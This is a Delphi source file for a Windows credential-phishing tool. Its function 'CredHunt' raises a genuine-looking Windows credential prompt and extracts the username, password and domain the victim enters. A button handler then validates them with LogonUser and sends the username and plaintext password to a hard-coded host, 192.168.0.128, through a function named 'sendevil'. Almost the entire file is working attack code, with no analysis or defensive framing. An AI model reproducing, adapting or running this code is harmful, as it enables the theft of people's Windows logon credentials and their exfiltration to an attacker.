unit code;



interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,wininet;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function sendevil(const Url: string): string;
var
  NetHandle: HINTERNET;
  UrlHandle: HINTERNET;
  Buffer: array[0..1023] of Byte;
  BytesRead: dWord;
  StrBuffer: UTF8String;
begin
  Result := '';
  BytesRead := Default(dWord);
  NetHandle := InternetOpen('Mozilla/5.0(compatible; WinInet)', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

  // NetHandle valid?
  if Assigned(NetHandle) then
    Try
      UrlHandle := InternetOpenUrl(NetHandle, PChar(Url), nil, 0, INTERNET_FLAG_RELOAD, 0);

      // UrlHandle valid?
      if Assigned(UrlHandle) then
        Try
          repeat
            InternetReadFile(UrlHandle, @Buffer, SizeOf(Buffer), BytesRead);
            SetString(StrBuffer, PAnsiChar(@Buffer[0]), BytesRead);
            Result := Result + StrBuffer;
          until BytesRead = 0;
        Finally
          InternetCloseHandle(UrlHandle);
        end
      // o/w UrlHandle invalid
      else
        writeln('Cannot open URL: ' + Url);
    Finally
      InternetCloseHandle(NetHandle);
    end
  // NetHandle invalid
  else
    raise Exception.Create('Unable to initialize WinInet');
end;




function CredHunt(const Acaption,ADescription :string;
AAuthError: Cardinal; var Auser,Apassword,Adomain:string;
var ASavePassword: Boolean):Boolean;
type

  PCredUIInfo = ^TCredUIInfo;
  TCredUIInfo = record
  cbSize : DWORD;
  hwndParent : HWND;
  pszMessageText : PChar;
  pszCaptionText : Pchar;
  hbmBanner : HBITMAP;

  end;

  const

  CRED_MAX_USERNAME_LENGTH              = 256;
  CREDUI_MAX_PASSWORD_LENGTH            = 256;
  CRED_MAX_DOMAIN_TARGET_NAME_LENGTH    = 256;

  cred                                  = 'credui.dll';

CredUIPromptForWindowsCredentialsName = {$IFDEF UNICODE}
                                          'CredUIPromptForWindowsCredentialsW'
                                          {$ELSE}
                                          'CredUIPromptForWindowsCredentialsA'
                                          {$ENDIF};
  CredUnPackAuthenticationBufferName    = {$IFDEF UNICODE}
                                          'CredUnPackAuthenticationBufferW'
                                          {$ELSE}
                                          'CredUnPackAuthenticationBufferA'
                                          {$ENDIF};
 CREDUIWIN_GENERIC                      = $00000001;
 CREDUIWIN_CHECKBOX                     = $00000002;
 CREDUIWIN_AUTHPACKAGE_ONLY             = $00000010;
 CREDUIWIN_IN_CRED_ONLY                 = $00000020;
 CREDUIWIN_ENUMERATE_ADMINS             = $00000100;
 CREDUIWIN_ENUMERATE_CURRENT_USER       = $00000200;
 CREDUIWIN_SECURE_PROMPT                = $00001000;
 CREDUIWIN_PACK_32_WOW                  = $10000000;

var
 lib : HMODULE;
CredUIPromptForWindowsCredentials: function (
var pUiInfo : TCredUIInfo;dwAuthError:DWORD; var pulAuthPackage:ULONG;pvInAuthBuffer:PCardinal;ulInAuthBufferSize:ULONG;
out ppvOutAuthBuffer: Cardinal; out pulOutAuthBufferSize: ULONG;
 pfsave: PVOID; dwFlags:DWORD): DWORD; stdcall;

 CredUnPackAuthenticationBuffer: function (dwFlags:DWORD;pAuthBuffer:PVOID;cbAuthBuffer:DWORD;pszUserName:LPSTR;
 var pcchlMaxUserName:DWORD;  pszDomainName:LPSTR; var pcchMaxDomainName:DWORD;pszPassword:LPSTR; var pcchMaxPassword:DWORD
 ): LONGBOOL; stdcall;

 CredInfo : TCredUIInfo;
 lAuthPackage : ULONG;
 lMaxUsername,lMaxDomainName,lMaxPassword:Dword;
 user,password :string;
 lUsername,lPassword,lDomain : array [Byte] of Char;
 loutbuffer : Cardinal;
 loutbuffersize : DWord;


 begin
  lib := safeloadlibrary(cred);
  if Lib <> 0  then

 try
  CredUIPromptForWindowsCredentials := GetProcAddress(lib,CredUIPromptForWindowsCredentialsName);
  CredUnPackAuthenticationBuffer := GetProcAddress(lib,CredUnPackAuthenticationBufferName);

  if assigned(CredUIPromptForWindowsCredentials) and assigned(CredUnPackAuthenticationBuffer) then
  begin
  Fillchar(CredInfo, sizeof(CredInfo),0);
  CredInfo.cbsize := sizeof(Credinfo);

   if screen.FocusedForm <> nil  then
   credinfo.hwndParent := screen.FocusedForm.Handle
   else
   if screen.Activeform <> nil then
   credinfo.hwndParent := screen.activeform.Handle
   else
  Credinfo.hwndParent := 0;

  Credinfo.pszCaptionText := Pchar(ACaption);
  Credinfo.pszMessageText := Pchar(ADescription);

  lAuthPackage := 0;


  case CredUIPromptForWindowsCredentials(
   CredInfo,AAuthError,lAuthPackage,nil,0,lOutBuffer,lOutBufferSize,@ASavePassword,CREDUIWIN_GENERIC or CREDUIWIN_CHECKBOX) of

  NO_ERROR: begin
     Zeromemory(@lusername,sizeof(lusername));
     Zeromemory(@lPassword,sizeof(lpassword));
     zeromemory(@lDomain,sizeof(lDomain));
 Result := CredUnPackAuthenticationBuffer(0,pointer(loutbuffer),loutbuffersize,
            @lusername,lMaxUsername,
            @lDomain,lMaxDomainname,
            @lpassword,lMaxPassword);
        if result  then
        begin
      Auser := string(lusername);
      Apassword := string(lpassword);
      ADomain := string(lDomain);
      result := true;
      end;

  end;
  ERROR_CANCELLED:
   result := false;
   else
  raise exception.Create('failed');
  end;
  end  else
  RaiseLastOSError;
  finally
  FreeLibrary(lib);
  end;



 end;


procedure TForm1.Button1Click(Sender: TObject);
var
username,password,domain:string;
savepassword:boolean;
TOKEN : Thandle;
begin

if not CredHunt('test','test',$0,username,password,domain,savePassword)
then
exit;
if not Logonuser(@username[1],nil,@password[1],LOGON32_LOGON_NETWORK,LOGON32_PROVIDER_DEFAULT,TOKEN) then

sendevil('http://192.168.0.128/failed '+username+'pass='+password)
else
sendevil('http://192.168.0.128/success '+username+'pass=' +password);
end;


end.
